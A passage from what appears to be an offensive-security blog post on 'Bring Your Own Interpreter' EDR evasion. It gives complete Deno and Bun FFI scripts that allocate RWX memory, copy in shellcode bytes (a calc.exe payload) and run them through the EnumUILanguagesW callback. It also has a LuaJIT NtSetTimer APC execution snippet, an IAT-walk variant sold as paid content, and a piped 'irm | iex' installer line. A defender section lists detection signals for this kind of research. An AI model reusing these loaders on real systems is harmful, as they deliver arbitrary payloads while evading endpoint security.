**Subtlety 1: typed symbol maps.** Deno's FFI requires you to describe every symbol's argument and return types up front: `parameters` and `result` are in the symbol map (`"pointer"`, `"usize"`, `"u32"`, `"isize"`, `"bool"`). It's more explicit than koffi's string prototypes, but it's the same idea: the runtime marshals the call for you, and our callback is just a `pointer` in. The copy needs one Deno-specific call: `Deno.UnsafePointer.of(shellcode)` to turn the typed array into a raw pointer for `memcpy`.

**Subtlety 2: The permission model is a bit of an IOC.** Deno's sandboxed permission model means FFI access requires an explicit flag. The run command is:

```powershell
PS C:\Users\administrator\denoenum> deno run --allow-ffi denoenum.ts
```

That `--allow-ffi` sits in the process command line for the entire lifetime of the runtime. It's a potential *Blue Team Defender Artifact* thing to grep for, and I'll flag it in the defender section. (Also note: the script only needs `--allow-ffi` — no `--allow-read`, no network, nothing else. Deno will tell you if a script tries to step outside its grants, which is exactly the kind of guardrail we're politely staying inside of.)

**Running it**

```powershell
PS C:\Users\administrator\denoenum> deno run --allow-ffi denoenum.ts
[+] Executing shellcode via EnumUILanguagesW...
```

<img width="1420" height="850" alt="image" src="https://github.com/user-attachments/assets/c56da0c0-089a-4c99-a2bf-23701be62ff1" />

**Why Deno stays quiet**

- **Zero-dependency supply chain.** No `npm install`, no native module compilation, no third-party package that a defender can map to a known-malicious download. One vendor binary, one text file.
- `deno.exe` is a single ~100 MB, well-known, developer-trusted binary.
- The `--allow-ffi` flag is a deliberate, *auditable* capability grant, which cuts both ways: it's an IOC for the defender, but it also means the runtime itself is telling us "this program declared what it needs up front," which reads less like a malware sandbox escape and more like... a program. 😆

Bun, what a great name 🍔
-

**Bun** is the fastest member of this lineup and the newest.  It's a JavaScript/TypeScript runtime built on JavaScriptCore (via the Zig toolchain) that's been eating the world's build scripts for the last couple of years. Like Deno, it ships FFI **built in** — `bun:ffi` — so there's no package install, no native module, no `node_modules`. One binary, one file, done.

**Installing Bun**

```powershell
# Windows PowerShell
powershell -c "irm bun.sh/install.ps1 | iex"

# or
winget install oven-sh.bun
```

**The script: `bunenum.ts`**

```typescript
import { dlopen, FFIType, ptr } from "bun:ffi";

const kernel32 = dlopen("kernel32.dll", {
  GetCurrentProcess: {
    args: [],
    returns: FFIType.ptr,
  },
  VirtualAllocExNuma: {
    args: [FFIType.ptr, FFIType.ptr, FFIType.u64, FFIType.u32, FFIType.u32, FFIType.u32],
    returns: FFIType.ptr,
  },
  VirtualFree: {
    args: [FFIType.ptr, FFIType.u64, FFIType.u32],
    returns: FFIType.bool,
  },
  EnumUILanguagesW: {
    args: [FFIType.ptr, FFIType.u32, FFIType.i64],
    returns: FFIType.bool,
  },
});

const msvcrt = dlopen("msvcrt.dll", {
  memcpy: {
    args: [FFIType.ptr, FFIType.ptr, FFIType.u64],
    returns: FFIType.ptr,
  },
});

const MEM_COMMIT = 0x1000;
const MEM_RESERVE = 0x2000;
const PAGE_EXECUTE_READWRITE = 0x40;
const MEM_RELEASE = 0x8000;

// Shellcode (calc.exe)
const shellcode = new Uint8Array([
  0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60,
  0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x70, 0x10, 0x48, 0x8B, 0x36, 0x48, 0x8B, 0x36, 0x48, 0x8B,
  0x5E, 0x30, 0x49, 0x89, 0xD8, 0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31, 0xC9, 0x66, 0x81,
  0xC1, 0xFF, 0x88, 0x48, 0xC1, 0xE9, 0x08, 0x8B, 0x14, 0x0B, 0x4C, 0x01, 0xC2, 0x44, 0x8B, 0x52,
  0x14, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4C, 0x89, 0xD1, 0x48, 0xB8,
  0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x90, 0x90, 0x48, 0xC1, 0xE0, 0x10, 0x48, 0xC1, 0xE8, 0x10,
  0x50, 0x48, 0xB8, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x50, 0x48, 0x89, 0xE0, 0x67,
  0xE3, 0x20, 0x31, 0xDB, 0x41, 0x8B, 0x1C, 0x8B, 0x4C, 0x01, 0xC3, 0x48, 0xFF, 0xC9, 0x4C, 0x8B,
  0x08, 0x4C, 0x39, 0x0B, 0x75, 0xE9, 0x44, 0x8B, 0x48, 0x08, 0x44, 0x39, 0x4B, 0x08, 0x74, 0x03,
  0x75, 0xDD, 0xCC, 0x51, 0x41, 0x5F, 0x49, 0xFF, 0xC7, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x1C,
  0x4D, 0x01, 0xC3, 0x43, 0x8B, 0x04, 0xBB, 0x4C, 0x01, 0xC0, 0x50, 0x41, 0x5F, 0x4D, 0x89, 0xFC,
  0x4C, 0x89, 0xC7, 0x4C, 0x89, 0xC1, 0x4D, 0x89, 0xE6, 0x48, 0x89, 0xF9, 0xB8, 0x61, 0x64, 0x90,
  0x90, 0xC1, 0xE0, 0x10, 0xC1, 0xE8, 0x10, 0x50, 0x48, 0xB8, 0x45, 0x78, 0x69, 0x74, 0x54, 0x68,
  0x72, 0x65, 0x50, 0x48, 0x89, 0xE2, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x48, 0x83, 0xC4,
  0x30, 0x49, 0x89, 0xC5, 0x4D, 0x89, 0xE6, 0x48, 0x89, 0xF9, 0x48, 0xB8, 0x57, 0x69, 0x6E, 0x45,
  0x78, 0x65, 0x63, 0x00, 0x50, 0x48, 0x89, 0xE2, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x48,
  0x83, 0xC4, 0x30, 0x49, 0x89, 0xC6, 0x48, 0x83, 0xC4, 0x08, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x50,
  0x48, 0xB8, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x50, 0x48, 0x89, 0xE1, 0xBA, 0x01,
  0x00, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x30, 0x41, 0xFF, 0xD6, 0x31, 0xC9, 0x41, 0xFF, 0xD5,
]);

const size = shellcode.length;
const hProcess = kernel32.symbols.GetCurrentProcess();

const exec = kernel32.symbols.VirtualAllocExNuma(
  hProcess,
  null,
  size,
  MEM_COMMIT | MEM_RESERVE,
  PAGE_EXECUTE_READWRITE,
  0,
);

if (!exec) {
  console.log("[-] VirtualAllocExNuma failed");
  process.exit(1);
}

// Copy shellcode
const shellcodePtr = ptr(shellcode);
msvcrt.symbols.memcpy(exec, shellcodePtr, size);

console.log("[+] Executing shellcode via EnumUILanguagesW...");
kernel32.symbols.EnumUILanguagesW(exec, 0, 0);

kernel32.symbols.VirtualFree(exec, 0, MEM_RELEASE);
console.log("[+] Done");
```

The one thing that stands out in Bun's FFI API is the `ptr()` helper.  It wraps the buffer so `memcpy` can grab a raw pointer into the shellcode table. Note that it's the **`exec` pointer**: the RWX region, that gets handed to `EnumUILanguagesW` as the callback, not the original JS-heap buffer. The `ptr()` wrap exists purely to feed the copy; the OS gets the address it's going to actually execute.

Bun's script uses the same familiar calc shellcode payload, so a successful run looks identical to the Lua/Julia/Node ones.

**Running it**

```powershell
PS C:\Users\administrator\bunenum> bun bunenum.ts
[+] Executing shellcode via EnumUILanguagesW...
```

<img width="1420" height="850" alt="image" src="https://github.com/user-attachments/assets/14cd17e9-9e47-43b5-b5b1-2c86630a5cfe" />

**Why Bun stays quiet**

- **Zero-dependency FFI**, same story as Deno, but with *no permission flag* required. `bun bunenum.ts` is a completely unadorned command line. No `--allow-ffi`, nothing to grep for, nothing in the command line that hints at what the script is about to do.
- `bun.exe` is a single-file, developer-trusted binary with a fast-growing reputation footprint (it's installed by a lot of modern tooling by default now).

Putting It All Together — Why This Stays Under the Radar
-

Let's zoom out and look at what an EDR actually has to work with when one of these runs. The table below compares the four vehicles side by side:

| Vehicle | Install footprint | FFI origin | Command-line IOC |
|---|---|---|---|
| `luajit.exe` | ~500 KB, 1 file | Built-in (`ffi` lib) | script name only |
| `julia.exe` | ~200 MB+ install | Built-in (`ccall`) | script name only |
| `node.exe` | ~80 MB install + `node_modules` | `koffi` (npm) | script name (+ `npm install` if not pre-staged) |
| `deno.exe` | ~100 MB, 1 file | Built-in (`Deno.dlopen`) | **`--allow-ffi`** |
| `bun.exe` | ~50–100 MB, 1 file | Built-in (`bun:ffi`) | script name only |

A few things stand out from that table, and a few things I'm being deliberately honest about not claiming:

**What we've eliminated** (relative to a compiled loader):

- The **custom binary** — the single strongest static indicator of a loader. There is no custom hash, no custom section layout, no AI/ML target. The file on disk is a public interpreter with a public reputation.
- The **injection telemetry** — no `CreateRemoteThread`, no `WriteProcessMemory`, no cross-process memory writes. All allocation, copy, and execution happen inside the interpreter's own address space.
- The **image-load event** for the payload — there is no PE to load.
- The **direct call site** — the transfer of control into RWX memory is performed by OS enumeration/APC machinery, not by our code.

**What the EDR can still see** (and should see — this is evasion, not foolproof invisibility 😸):

- A process allocating `RWX` memory and then having a callback land in that non-image region. Modern EDRs with memory-protection monitoring (the kind that track RWX allocations and watch for control-flow transfers into them) will have a legitimate, well-motivated signal here.
- A parent/child anomaly: `calc.exe` (or whatever the real payload launches) spawning from `luajit.exe` / `julia.exe` / `node.exe` instead of something like `explorer.exe`. That's a classic behavioral rule and it will fire.
- The interpreter process itself doing an allocation that is unusual for its "personality" (a language runtime allocating `PAGE_EXECUTE_READWRITE` is not normal behavior for `julia.exe`).

The honest framing: **BYOI doesn't hide the RWX allocation. It hides the *attacker's fingerprint* around it.** The EDR sees "a trusted developer tool allocated RWX memory and something ran in it" — which is a real signal, but it's a signal with no custom hash, no known-bad binary, no injection API, and no script-logging telemetry to cross-reference. It forces the defender to make a judgment call about a *reputable* process instead of matching a pattern.

🛡️ For the Defenders 🛡️
-

One thing worth noting for defenders reading this: the signals are real, and here's where I'd look, in rough order of effort:

1. **RWX + non-image callback**: alert on `NtAllocateVirtualMemory` with `PAGE_EXECUTE_READWRITE` followed by a control-flow transfer into that region *that does not originate from a user-mode `call` in the same module*. The return address sitting in `ntdll`/`kernel32` enumeration code is the tell.
2. **`--allow-ffi` in command lines**: a one-line grep across process-creation events. Deno FFI usage is *declared* — use that.
3. **`npm install` in dev-tool process trees**: `node.exe` spawning `npm install` in a user profile directory, out of band from any editor, is worth a look.
4. **Parent/child anomalies**: Any unusual child process with a parent that's a scripting runtime. 
5. **Unreputable small binaries that *are* interpreters**: `luajit.exe` at 500 KB has far less reputation cushion than `node.exe`. If an unknown small binary is a script interpreter *and* is allocating RWX, that's two weak signals that reinforce each other.

The counter to all of the above, of course, is that these are all *behavioral* signals against *trusted* processes, which is exactly the tradeoff BYOI makes. You're trading "obviously bad binary" for "weird behavior from a good binary."

Full Source Code
-

All five scripts from this post: [Source Code](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2026-11-25-Bring%20Your%20Own%20Interpreter%20-%20EDR%20Evasion%20with%20LuaJIT%2C%20Julia%2C%20Node.js%2C%20Deno%2C%20and%20Bun)

🎁 ***Bonus Content for Members! (Sapphire & Emerald Tiers)*** 🎁
-

**`iatenum.lua` — the IAT-assisted resolution variant for LuaJIT.**

[Grab the full source for: iatenum.lua on Ko-fi](https://ko-fi.com/s/10c6f05ad4)

This is the same `EnumUILanguagesW` trick, but with a twist on *how the script finds its own APIs*. Instead of binding `VirtualAllocExNuma` and `EnumUILanguagesW` directly through `ffi.load("kernel32")`, the script walks the **interpreter's own Import Address Table** at runtime — parsing `luajit.exe`'s PE headers in memory (base from `GetModuleHandleA(nil)`, then DOS header → `e_lfanew` → `IMAGE_NT_HEADERS` → import data directory), printing the full import table x64dbg-style as it goes:

```
[*] Imports for luajit.exe (base 0x7ff7a1b2c000)
  0x00007ff7a1b2c678   Import  kernel32.dll.GetModuleHandleA
  0x00007ff7a1b2c670   Import  kernel32.dll.GetProcAddress
  0x00007ff7a1b2c668   Import  kernel32.dll.ExitProcess
  ...
[+] Found kernel32.dll.GetProcAddress
    IAT slot: 0x7ff7a1b2c670
    Value:    0x7ff9d8e4f1a0
```

The walk reads the **already-resolved pointer** sitting in each IAT slot.  The value the Windows loader wrote there at process start, so there's no string lookup or export walk happening in the script at all. Once `GetProcAddress` is found, the script `ffi.cast`s that pointer into a function-pointer typedef and uses it to resolve `VirtualAllocExNuma`, `EnumUILanguagesW`, `VirtualFree`, and `GetCurrentProcess` from the `kernel32.dll` module handle at runtime.

The subtle payoff: the script carries **no static FFI binding** to the allocation or enumeration APIs.  Those references only exist as resolved pointers in memory after the IAT walk. The one exception is `GetModuleHandleA` itself, which the script binds directly through `ffi.load` as the bootstrap: it's the chicken-and-egg move.  You need one FFI binding to find the function that finds all the others. And the IAT walk works on *any* process that imports `GetProcAddress`, which is to say... pretty much any Windows process. 😆

***Bonus Content for Members! (Diamond Tier)***
-

**The `NtSetTimer` APC variant — `timerex.js` (Node/koffi) and `timer.lua` (LuaJIT).**

This is the second door I mentioned in the callback trap section. Instead of `EnumUILanguagesW`, the scripts use Windows notification timers:

```lua
-- timer.lua (LuaJIT) — the core of the run
local kernel32 = ffi.load("kernel32")
local ntdll    = ffi.load("ntdll")

local hTimer = ffi.new("HANDLE[1]")
ntdll.NtCreateTimer(hTimer, 0x0002, nil, 0)  -- TIMER_MODIFY_STATE, notification timer

local due = ffi.new("LARGE_INTEGER")
due.QuadPart = -1000000  -- 100 ms relative (100-ns units)

print("[*] scheduling NtSetTimer (100 ms, TimerApcRoutine = shellcode)...")

status = ntdll.NtSetTimer(
    hTimer[0],
    due,
    exec,   -- TimerApcRoutine = shellcode
    nil,    -- TimerContext
    0,      -- ResumeTimer = FALSE
    0,      -- Period = 0 (one-shot)
    nil     -- PreviousState
)

print("[*] entering alertable wait (SleepEx)...")
kernel32.SleepEx(5000, 1)   -- 5 seconds, alertable — the only reason this works

print("[!] 5 s elapsed and the APC never dispatched")
```

The subtleties here are what make it fun:

- **`TimerApcRoutine` is our shellcode.** `NtSetTimer` takes a `TimerApcRoutine` callback, and when the 100 ms timer expires, the kernel queues a user-mode APC containing it. The APC lands on the main thread *only because* the thread is parked in `SleepEx(5000, TRUE)` — an **alertable** wait. Remove the alertable flag and the APC just sits in the queue.
- **`ntdll`, not `kernel32`.** The notification timer APIs (`NtCreateTimer`, `NtSetTimer`) live in `ntdll.dll`.  Another reason these two scripts bind `ntdll` directly.
- **The tradeoff, honestly stated:** APC-based timer tricks are a *known* technique in the EDR world (they've been used for APC injection patterns for years), so a tuned EDR watching `NtSetTimer` for non-image `TimerApcRoutine` pointers may have a rule for exactly this. The `EnumUILanguagesW` variant is the quieter of the two in my experience; the timer variant is the more elegant.

[Grab the Diamond timer scripts (timerex.js + timer.lua) on Ko-fi](https://ko-fi.com/s/26d3c5c3a5)

📹 Video Walkthrough coming soon! Stay tuned 📹

***ANY.RUN Results***
-

> Here's a sample review from Any.RUN of bunenum.ts!

<img width="2562" height="1304" alt="image" src="https://github.com/user-attachments/assets/acb01bbb-04f0-4071-ad8f-f9257c41a4f7" />

[Full Sandbox Analysis](https://app.any.run/tasks/9d9d41fd-14bb-4151-b404-1e5948c00ece)

<div style="text-align: right;">
  
<b>Sponsored By:</b><br>

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/anyrun.png" />

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/vector35.png" />

</div>

And that's a wrap, folks! Five interpreters, one callback, and a whole lot of reasons not to compile a loader when the OS will happily press the button for you 😺 Thanks for reading, and see you on the next blog post!

~G3tSyst3m
